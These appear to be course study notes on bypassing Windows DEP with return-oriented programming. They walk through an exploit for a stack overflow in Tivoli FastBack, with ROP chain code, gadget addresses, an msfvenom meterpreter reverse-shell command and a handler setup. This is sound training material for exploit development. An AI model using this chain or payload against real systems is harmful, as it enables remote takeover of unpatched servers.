---

---
[[#DEP Theory]]
[[#Return Oriented Programming]]
[[#Gadget Selection]]
[[#Bypassing DEP]]
	[[#Getting the Offset]]
	[[#Locating Gadgets]]
	[[#Preparing the Space]]
	[[#Initial ROP Gadget]]
	[[#Obtaining VirtualAlloc Address]]
	[[#Pushing a Return Address]]
	[[#Executing VirtualAlloc]]
	[[#Getting a Reverse Shell]]

 
---
# DEP Theory
DEP requires a compatible CPU and sets the NX (non-executable) bit on sections of .data, as opposed to .code/.text sections, preventing data injections from being ran.

nX (non-Executable bit) : Enforces DEP, can be set from /NoExecute, boot.ini, bcdedit.exe

DEP Options:
OptIn : DEP enabled for system processes and custom-defined apps. Default for most client systems.
OptOut : DEP is enabled for everything but specifically exempt apps.
AlwaysOff
AlwaysOn : Default for most server systems.

`LdrpCheckNXCompatibility` in `ntdll.dll` runs some checks to determine if NX should be set (dynamically enabling / disabling DEP), then makes a call to `NtSetInformationProcess` to change NX on the process.

DEP in Notepad Demo:
1. Attach WinDbg to notepad.exe
2. `!vprot eip` : show protections on memory at eip (code section) -> Protect = PAGE_EXECUTE_READ
3. `!vprot esp` : show on memory at esp (data section) -> Protect = PAGE_READWRITE
4. `.load narly` -> `!nmod` : notepad is compiled with \*DEP
5. `ed esp 90909090` : edit in 4 NOPs at esp
6. `r eip = esp` : point eip at the stack
7. `p` : run the nop instruction, yields an access violation because this memory is not executable (NX is set)

### Windows Defender Exploit Guard (WDEG)
Apps that were built without DEP can still have it applied via WDEG (previously through EMET, Enhanced Mitigation Experience Toolkit)

Enable WDEG on Tivoli FastBack:
1. WinKey -> Windows Defender Security
2. App & browser control
3. Exploit protection settings
4. Add program to customize -> Choose exact file path -> Browse to `C:\Program Files\Tivoli\TSM\FastBack\server`
5. DEP: Enable, Override system settings
6. WinKey -> Services
7. Restart Tivoli FastBack
8. Repeating above Notepad Demo on FastBack should give an access violation
> !nmod in WinDbg will still show no DEP since it was not natively compiled with it


---
# Return Oriented Programming
The first DEP bypass was return-to-libc (ret2libc) on Linux, which evolved into ROP as it is today, which also works on Windows.

### Origins of ROP
Initially Windows DEP could be avoided just by calling `NtSetInformationProcess` through a hijacked JMP ESP and pushing the required arguments on the stack to turn it off. Later Windows used Permanent DEP where any .exe linked with the /NXCOMPAT flag is forced to OptIn with DEP, meaning DEP can't be turned off while the process is running.


### ROP Evolution
ROPs are "borrowed code chunks" starting a few instructions above the return of their original functions to build more complex functionality, like reading or writing from a memory location.
![[1b5feab5d7d09306057de44459d9ce8d-dep_gadget_writestack-1.png]]

Returning into the middle of existing opcodes can also create new instructions, while still terminating in the typical return instruction. Ex. `pop ebp` read one byte later turns into `add al, 5Dh`

We could build a 100% ROP shellcode, but it is much easier to build a ROP stage that then allows execution of traditional shellcode.
Option 1: Allocate memory with VirtualAlloc and write shellcode to it
Option 2: Write shellcode then change its memory page permissions with VirtualProtect
Both the VirtualAlloc and VirtualProtect addresses will be found in the Import Address Table (IAT) of the target DLL.

The API calls will require parameters to be pushed. Most can be called statically (baked into shellcode) but other arguments must be gathered at runtime using more ROP gadgets.

Option 3: Use WriteProcessMemory to patch the code section at runtime (the .text section) to inject our shellcode and jump to it later.


---
# Gadget Selection
Finding ROPs manually (like with WinDbg search) would be very tedious, luckily there are automated tools for this.
- Pykd WinDbg Extension
- RP++
- Mona (not covered because it doesn't support Python3 or 64-bit)

### Debugger Automation: Pykd
A Python based WinDbg extension with APIs to automate debugging and crash analysis. Makes finding ROP gadgets a lot easier with the below script that runs within the debugger.

[[pykd script]]

High level logic:
1. Accept the name of a module (application) and find it in memory
2. For this module, locate all memory pages that are executable (check memory protection at first addr of page: 0x10, 0x20, 0x40, 0x80)
3. For these pages, locate and store memory addresses of all `ret` instructions
4. For these addresses, step back one byte at a time and disassemble to check for valid instructions. Store instructions if they are valid.

Use:
1. Run `.load pykd` from WinDbg
2. `!py C:\Tools\pykd\SCRIPT_NAME.py MODULE_NAME` 
3. All found gadgets will be output to a text file

### RP++
https://github.com/0vercl0k/rp
CLI ROP searching tool. Runs way faster, and not inside the debugger.

1. (Located in C:\\tools\dep on student VM), copy target .exe to the rp++ folder.
2. Run rp++ with `rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt`. Where `-r` is the gadget (not byte) length from the return.
3. Search for desired instructions in the output file, ex. CTRL-F`: pop eax ; ret"


---
# Bypassing DEP
Exploit recap: we are sending a packet to TCP port 11460 with opcode 0x534 (code path leads to an sscanf with a user-controller argument) and sending a large string to the File parameter to be parsed by sscanf.

### Getting the Offset
Prep the exploit to trigger the buffer overflow with a custom input string. Use this custom input string to determine at exactly what input offset the eip overwrite happens and what input offset overwrites into the esp memory location (for initiating our ROP chain).

1. Get the offset into sscanf "File" field where eip is overwritten
	1. `msf-pattern_create -l 0x200`
	2. Edit python script `psCommandBuffer` with this expected string and the msf-pattern formatted into the File field
	3. Run script and get eip value at access violation
	4. `msf-pattern_offset -q VALUE` to get offset to eip
2. Do the same for the memory at esp to determine if we need padding between the eip control of the input buffer and the rop chain.
	- The offsets in the example are 276 and 280, meaning they are back to back and don't require padding
1. Check for bad input characters (use techniques from previous sections)
	- Bad chars: 0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20

### Locating Gadgets
Start the gadget finding process by finding suitable modules to pull gadgets from. The first choice would be from the vulnerable module itself, in this case, FastBackServer
`lm m FastBackServer`
However, this is a problem because the module lies in null character address space, `00400000` - `00c0c000`, and so cannot be pointed to through our input buffer (0x00 is a bad character)

>If we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.
>Native Windows modules often have additional protections enabled, which will require an even more advanced approach, as we shall find in a future module.

- The FastBackServer module cannot be used as it begins with a null-byte
1. Find an alternative module loaded into the application
	- `lm` turns up many suitable modules, one being: CSFTPAV6.dll
2. Copy CSFTPAV6.dll to the directory with the rp++ .exe
3. Run rp++ on this dll to ensure addresses returned are reachable
	1. `rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt`

### Preparing the Space
Push a placeholder "skeleton" system call to VirtualAlloc on the stack, including the currently unknown address to our shellcode and the address of the VirtualAlloc function itself. This should go ABOVE the eip overflow DWORD on the stack.
[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc): reserve, commit, or change a region of pages' state in virtual address space. 
```
LPVOID WINAPI VirtualAlloc(
   _In_opt_ LPVOID lpAddress,
   _In_     SIZE_T dwSize,
   _In_     DWORD  flAllocationType,
   _In_     DWORD  flProtect
 );
 ```
 - if lpAddress points to a committed memory page (already allocated) then flProtect will specify the new protections for that page. This is the same functionality as VirtualProtect
 - dwSize specifies the memory region size, but VirtualAlloc can only change protections on one page per call, so ensure this value is less than 1 page (0x100 bytes)
 - flAllocationType takes a predefined enum and should be set to the MEM_COMMIT (0x00001000) in this case
 - flProtect should be set to PAGE_EXECUTE_READWRITE (0x00000040)
 
1. Theoretical VirtualAlloc call structure
	```
	0d2be300 75f5ab90 -> KERNEL32!VirtualAllocStub
	0d2be304 0d2be488 -> Return address (Shellcode on the stack)
	0d2be308 0d2be488 -> lpAddress (Shellcode on the stack)
	0d2be30c 00000001 -> dwSize
	0d2be310 00001000 -> flAllocationType
	0d2be314 00000040 -> flProtect
	```
	- But we don't know the values of VirtualAlloc or the shellcode yet, so we can use dummy values here
	- The arguments to be pushed to VirtualAlloc contain null bytes and so also will have to dummy values that are filled in later
1. Edit python script to input the above stack values
	- `pattern += pack('<i', 0x41414141) # eip overflow, return to VirtualAlloc`
	- and so on for other return address and args
	
3. Run script against FastBackServer to make sure it works
	1. `dd esp - 1C` after the access violation (eip of 42424242) to ensure expected values are pushed on the stack before the eip value
	2. Notice that some of the values were zero'd out before we got the access violation. This isn't a problem because they are dummy values that can be overwritten again with ROP gadgets before our VirtualAlloc call.

### Initial ROP Gadget
Use an initial ROP gadget pointed to by our eip overflow. The gadget will store esp's current value into another register for use as a pointer back to our controlled stack space as we progress through the ROP chain.

1. Use rp++ to search for a gadget that will copy esp's current value
	1. `mov eax, esp ; ret` is ideal but not likely, find something with similar functionality.
		- Ex. `push esp ; push eax ; pop edi ; pop esi ; ret` at 0x50501110
2. Replace value of eip in the python script with this gadget address
3. Verify gadget works and copies esp value to another register
	1. `bp GADGET_ADDR`
	2. step through, `dd esp L1`, ensure new register matches esp
- Notice that after the gadget, the next address returned into eip is the next value on this stack, this is what allows us to ROP chain


### Obtaining VirtualAlloc Address
The VirtualAlloc call skeleton is pushed to stack (structured properly, but with dummy values). Develop a ROP chain to dynamically populate it with proper arguments, starting by finding the runtime address of the VirtualAlloc function. Then write this to the top of the stack as per our skeleton layout.

IAT (Import Address Table) : table created per module that contains the addresses of all API's that are implemented by the current module.
VirtualAlloc : function to allocate memory during runtime.

1. Find the static address of the IAT entry containing VirtualAlloc's address with IDA
	1. Imports tab ->CTRL-F: VirtualAlloc
	- The address of VirtualAlloc changes on reboot, but the address of the IAT entry that contains it does not change
	
2. Get the stack address of the value we need to overwrite
	1. `dd esi - 1c` to view pushed dummy values. The VirtualAlloc needs to go at the top dummy position at -0x1c
	2. rp++: try to search for `sub esi, 0x1c ; retn` since esi contains our esp copy; an instruction this direct doesn't exist. Instead, look to use the stack to push a value and then do step by step arithmetic from there to calculate the value in an arithmetic register (eax/ecx)
		- If the ROP chain includes extraneous pop's then we need to add dummy values to the stack
	3. Add these gadget locations into the python script `rop += pack("<L", (ADDR))`
	4. Step through the gadgets to confirm it worked. (eax/ecx should contain esp - 0x1c)
	5. Find another gadget to `pop eax ; push esi`, add to python script, and verify
	- [[#ROP Chain 1 Spoiler]]
 
3. Resolve the runtime address of VirtualAlloc to put into placeholder VirtualAlloc value on the stack
	1. IAT address of VirtualAlloc contains a bad char, so push a higher or lower value onto stack and find gadgets to dec/inc it back.
	2. Dereference the VirtualAlloc address with a `mov eax, dword [eax]` instruction
	3. Edit script, and run to verify
	4. Move the value in eax to the address pointed to by esi with a `mov dword [esi], eax`
	5. Edit script and verify. Use `dds esi L1` and verify that it resolves to `KERNEL32!VirtualAllocStub`
	- [[#ROP Chain 2 Spoiler]]	


### Pushing a Return Address
The next value on the stack we need is a return address to our future shellcode after VirtualAlloc executes. This will be written to the 2nd position on the stack as per the skeleton layout.

1. Align esi to stack placeholder address
	1. Find similar functionality to `add esi, 0x4` since esi currently points to the address just above what we need.
	2. Edit script and verify `dd esi L1` to ensure esi points to the next placeholder value.

2. Overwrite the shellcode address on the stack with a (for now) fixed value
	- We don't know our exact shellcode offset yet because it needs to be placed at the end of our rop chain, of which we don't know the length of until we finish building it. For now, add a placeholder offset.
	1. Ideal chain to find: `move eax, esi ; pop ecx` (where static offset is then popped on stack), and `sub eax, ecx`. We simulate a shellcode address by calculating a static offset position from edi into eax. We can later change this offset when we get the actual address. 
	2. Find a `mov dword [esi], eax` to copy this value onto the stack
	3. Edit script, bp at last gadget and verify `dd poi(esi) L4` to ensure stack location points to the specified offset at the end of this gadget.


### Pushing Arguments
Push the arguments required by VirtualAlloc to the next 4 stack positions in the skeleton. These being: lpAddress: shellcode address
dwSize: 0x01
flAllocationType: 0x1000
flProtect: 0x40

1. Push (projected) shellcode address into lpAddress:
	1. Reuse `inc esi` gadgets to increase esi (our makeshift stack pointer) by 4, to the new argument address
	2. Move esi value into another register for arithmetic
		- Remember we can push dummy values on the stack to negate extraneous pops
	1. Subtract -0x20c (4 more than the -0x210 that the value pushed into the return address value 4 addresses up)
	2. `mov dword ptr [esi], eax`
	3. Test the gadget with `dd eax L4` at the end to confirm it points to our shellcode buffer string

2. Push 0x00000001 into dwSize
	1. Increment esi by 4
	2. Avoid null bytes by pushing a -1 and negating it
	3. Test the gadget and ensure 0x00000001 got pushed

3. Push 0x1000 into flAllocationType
	1. Increment esi by 4
	2. Avoid null bytes, creatively, since 0x1000 and its negation of 0xfffff000 both have null bytes
		- Clue: `? 1000 - 80808080 = XXXX` `?  80808080 + XXXX = 1000` adding together two registers to get the needed value of 0x1000
	1. Test the gadget and ensure 0x00001000 got pushed

4. Push 0x40 into flProtect
	1. Increment esi by 4
	2. Repeat adding technique from last step OR try a negation on -0x40 OR a sub -0x40 from 0
	3. Test the gadget and ensure 0x00000040 and all other arguments are pushed properly

5. Final testing
	1. Add an int3 instruction to the rop chain to force it to stop upon completion
	2. Run Fastback in Windbg until int3
	3. `dd esi - 20` shows the beginning of the VirtualAlloc skeleton, ensure these values are what is expected.
### Executing VirtualAlloc
VirtualAlloc's address, the following return address to shellcode, and the arguments for VirtualAlloc have all been pushed. Finally, call VirtualAlloc itself, changing the protections of the projected shellcode address, and return to the start of a dummy shellcode buffer.

1. Align esp to our stack address pointer to VirtualAlloc
	- Gadgets that modify esp directly are rare, but we can find `mov esp, ebp ; pop ebp ; ret` everywhere. We need to modify ebp so we can use the previous instruction
	1. esi still holds the address of the flProtect argument, move the value and decrement it to get the VirtualAlloc address.
		- Try adding a large value instead of adding a small value, since overflowed arithmetic will be dropped off the 32 bit register
	1. Move eax value into ebp. ie. `xchg eax, ebp ; ret`
	2. Use the `move esp, ebp ; ...` gadget from above and compensate for the `pop ebp` side effect
	3. Test chain, first ensure that the eax arithmetic leads to the VirtualAlloc address, then continue to ensure this ends up being returned to after its written to esp
		- `bp 0x... ".if @eax = 0x40 {} .else {gc}"` : use this to break on a frequently used rop gadget only when a condition is met, in this case, we break on the flProtect iteration by checking for its pushed value in eax.

2. Check memory protections of the shellcode address before/after VirtualAlloc call
	1.  `!vprot 0x...` using shellcode address

4. Align shellcode to offset used in ROP chain
	- This can be done via changing the offset in the ROP chain or by adding padding to the input so that our shellcode will start at our projected position.
	1. Calculate and add needed padding / or change coded offset
		- It needs to be set for the skeleton's return address and for the lpAddress argument, both require a relative offset from their position on the stack
	2. Test to ensure it returns at the start of the dummy shellcode instructions


### Getting a Reverse Shell
With a dummy buffer in place of the shellcode, generate a real shellcode with msfvenom, expand the size of our shellcode space in the exploit, and replace it with the new shellcode to get a reverse shell.

1. Generate shellcode
	1. `msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode`
2. Increase the size of the shellcode buffer to fit the shellcode
	1. Luckily, we can increase the shellcode buffer size in the python script (from 0x400 to 0x600) without breaking the exploit
3. Replace the dummy shellcode with the generated shellcode
4. Run `msfconsole` with `use multi/handler` and throw the exploit. `getuid` on the shell.


---

#### ROP Chain 1 Spoiler
```
# initial eip overflow gadget, save current esp to a new register (esi)
eip  = pack('<L', 0x50501110) # push esp; push eax; pop edi; pop esi; 
# rop chain to subtract 0x1c from esi
rop  = pack('<L', 0x5050118e) # mov eax, esi; pop esi; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x505115a3) # pop ecx; ret
rop += pack('<L', 0xffffffe4) # -0x1c
rop += pack('<L', 0x5051579a) # add eax, ecx; ret
rop += pack('<L', 0x5052f773) # push eax ; pop esi; ret
```

#### ROP Chain 2 Spoiler
```
# rop chain: dereference VirtualAlloc IAT pointer and store in [esi]
rop += pack('<L', 0x5053a0f5) # pop eax ; ret
rop += pack('<L', 0x5054a221) # IAT VirtualAlloc pointer (+1 to avoid bad char)
rop += pack('<L', 0x505410f4) # dec eax; pop ebp; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x5051f278) # mov eax, [eax]; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax; ret
```
